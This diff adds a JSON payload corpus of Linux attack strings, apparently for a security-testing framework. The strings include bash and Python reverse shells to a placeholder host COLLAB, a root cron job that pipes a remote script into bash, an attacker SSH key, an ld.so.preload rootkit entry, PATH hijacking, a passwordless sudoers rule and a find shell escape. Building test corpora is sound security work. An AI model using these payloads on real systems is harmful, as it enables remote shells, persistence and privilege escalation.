@@ -1,0 +1,16 @@
+{
+  "schema": "12-schemas/payload.schema.json",
+  "corpus_id": "PL-OS-LINUX",
+  "version": "1.0.0",
+  "provenance": { "source": "PAT", "ref": "master@2026-01-15", "secondary": "GTFOBINS@master@2026-01-12" },
+  "payloads": [
+    { "payload_id": "PL-OS-LNX-0001", "cwe_id": "CWE-78", "context": "command", "surface": "stdin", "engine": "bash", "payload": "bash -i >& /dev/tcp/COLLAB/4444 0>&1", "severity": "critical", "tags": ["reverse-shell"], "classification": "T2" },
+    { "payload_id": "PL-OS-LNX-0002", "cwe_id": "CWE-78", "context": "command", "surface": "stdin", "engine": "python3", "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"COLLAB\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "severity": "critical", "tags": ["reverse-shell", "python"], "classification": "T2" },
+    { "payload_id": "PL-OS-LNX-0003", "cwe_id": "CWE-269", "context": "file", "surface": "authorized_keys", "engine": "ssh", "payload": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOLLAB attacker@lab", "severity": "critical", "tags": ["persistence"], "classification": "T2" },
+    { "payload_id": "PL-OS-LNX-0004", "cwe_id": "CWE-732", "context": "cron", "surface": "file", "engine": "cron", "payload": "* * * * * root curl -s http://COLLAB/x.sh | bash", "severity": "critical", "tags": ["persistence", "cron"], "classification": "T2" },
+    { "payload_id": "PL-OS-LNX-0005", "cwe_id": "CWE-269", "context": "file", "surface": "ld.so.preload", "engine": "glibc", "payload": "/tmp/.x.so", "severity": "critical", "tags": ["persistence", "rootkit"], "classification": "T2" },
+    { "payload_id": "PL-OS-LNX-0006", "cwe_id": "CWE-732", "context": "file", "surface": "shell-profile", "engine": "bash", "payload": "export PATH=/tmp:$PATH  # in ~/.bashrc", "severity": "high", "tags": ["hijack", "path"], "classification": "T2" },
+    { "payload_id": "PL-OS-LNX-0007", "cwe_id": "CWE-250", "context": "file", "surface": "sudoers", "engine": "sudo", "payload": "user ALL=(ALL) NOPASSWD: /usr/bin/find", "severity": "critical", "tags": ["privesc", "misconfiguration"], "classification": "T2" },
+    { "payload_id": "PL-OS-LNX-0008", "cwe_id": "CWE-78", "context": "command", "surface": "argument", "engine": "find", "payload": "find . -exec /bin/sh -p \\; -quit", "severity": "critical", "tags": ["privesc", "gtfobins"], "classification": "T2" }
+  ]
+}
